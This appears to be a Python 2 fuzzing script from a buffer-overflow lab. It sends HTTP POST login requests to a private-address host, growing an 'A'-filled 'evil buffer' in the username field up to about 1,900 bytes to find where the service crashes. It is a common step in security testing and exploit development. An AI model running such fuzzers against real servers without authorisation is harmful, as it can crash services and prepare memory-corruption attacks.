#!/usr/bin/python
#This fuzzing script sends HTTP POST messages to an input on an http server.
#The size of the input will keep increasing 

import socket
import time
import sys


size = 100

while(size < 2000):
    try:
        print "\nSending evil buffer with %s bytes" % size

        inputBuffer = "A" * size #fill potentially vulnerable input with A's
        
        #Craft HTTP POST specific to the input:
        content = "username=" + inputBuffer + "&password=A"

        buffer = "POST /login HTTP/1.1\r\n"
        buffer += "Host: 192.168.171.10\r\n"
        buffer += "User-Agent: Mozilla/5.0 (X11; Linux_86_64; rv:52.0) Gecko/20100101 Firefox/52.0\r\n"
        buffer += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
        buffer += "Accept-Language: en-US,en;q=0.5\r\n"
        buffer += "Referer: http://192.168.171.10/login\r\n"
        buffer += "Connection: close\r\n"
        buffer += "Content-Type: application/x-www-form-urlencoded\r\n"
        buffer += "Content-Length: "+str(len(content))+"\r\n"
        buffer += "\r\n"

        buffer += content


        #Socket
        s =socket.socket (socket.AF_INET, socket.SOCK_STREAM)

        s.connect(("192.168.171.10", 80))
        s.send(buffer)

        s.close()
        
        #Increase buffer size on every login attempt
        size += 100
        time.sleep(10) # 10 second delay
    except:
        print "\nCould not connect"
        sys.exit()
